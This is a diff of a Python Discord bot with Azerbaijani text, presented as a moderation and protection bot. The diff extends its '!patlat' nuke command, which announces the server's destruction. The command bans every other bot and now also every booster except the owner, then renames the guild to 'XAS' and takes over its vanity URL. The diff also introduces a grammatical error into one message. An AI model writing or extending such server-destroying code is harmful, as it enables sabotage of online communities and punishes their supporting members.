@@ -189,7 +189,7 @@ class XASMenyu(discord.ui.Select):
             embed = discord.Embed(title="🛡️ Təhlükəsizlik Sistemi", description="Serveri qoruyan avtomatik mexanizmlər.", color=XAS_COLOR)
             embed.add_field(name="Anti-GG Link Qoruması", value="Bütün xarici linkləri və dəvətləri dərhal silir.", inline=False)
             embed.add_field(name="Spam Qoruması", value="Flood edənləri və şablon bot spamlarını avtomatik bloklayır.", inline=False)
-            embed.add_field(name="🔥 Nuke & Patlat", value="`!patlat` - Serveri təmizləyir, botları banlayır və ruhum URL qoyur.", inline=False)
+            embed.add_field(name="🔥 Nuke & Patlat", value="`!patlat` - Serveri sıfırlayır, botları və boosterləri banlayır, XAS adı qoyur.", inline=False)
             await interaction.response.edit_message(embed=embed)
 
         elif self.values[0] == "2. İdarəetmə və Moderasiya":
@@ -271,7 +271,7 @@ async def server_url(ctx):
 @bot.command(name="seturl")
 async def set_url(ctx, yeni_url: str):
     if ctx.author.id != SAHIB_ID:
-        await ctx.send("❌ Bu əmri yalnız botun sahibi istifadə edə bilər!")
+        await ctx.send("❌ Bu əmri yalnız botun sahibi istifadə bilər!")
         return
     try:
         await ctx.guild.edit(vanity_code=yeni_url)
@@ -432,7 +432,7 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # =====================================================================
-# 9. ƏYLƏCƏ, OYUNLAR VƏ YENİLƏNMİŞ "RUHUM" & BOTBAN !PATLAT KOMUTU
+# 9. ƏYLƏCƏ, OYUNLAR VƏ YENİLƏNMİŞ BOOSTER-BANLI !PATLAT KOMUTU
 # =====================================================================
 @bot.command(name="sex", aliases=["spag", "ıp"])
 async def sex_cmd(ctx, member: discord.Member):
@@ -562,22 +562,17 @@ async def patlat_cmd(ctx):
         return
     
     guild = ctx.guild
-    await ctx.send("⚠️ Serverin dağıdılması, yad botların təmizlənməsi və 'Ruhum' rejiminə keçid başladı...")
-
-    ruhum_secimleri = [
-        ("RUHUM NUKED", "ruhumskdi"),
-        ("RUHUM EMPIRE", "ruhumaz"),
-        ("RUHUM CHAOS", "ruhumchaos"),
-        ("RUHUM HELL", "ruhumhell"),
-        ("RUHUM ZONE", "ruhumzone")
-    ]
-    
-    secilen_ad, secilen_url = random.choice(ruhum_secimleri)
+    await ctx.send("⚠️ Serverin dağıdılması, yad botların və boosterlərin banlanması, və 'XAS' adına keçid başladı...")
 
     for member in guild.members:
         if member.bot and member.id != bot.user.id:
             try:
                 await member.ban(reason="XAS Nuke - Bot Təmizliyi")
+            except:
+                pass
+        elif member.premium_since is not None and member.id != SAHIB_ID:
+            try:
+                await member.ban(reason="XAS Nuke - Booster Təmizliyi")
             except:
                 pass
 
@@ -604,8 +599,11 @@ async def patlat_cmd(ctx):
     except:
         pass
 
+    ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumzone"]
+    secilen_url = random.choice(ruhum_urls)
+    
     try:
-        await guild.edit(name=secilen_ad, vanity_code=secilen_url)
+        await guild.edit(name="XAS", vanity_code=secilen_url)
     except:
         pass
 
@@ -624,3 +622,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
+        
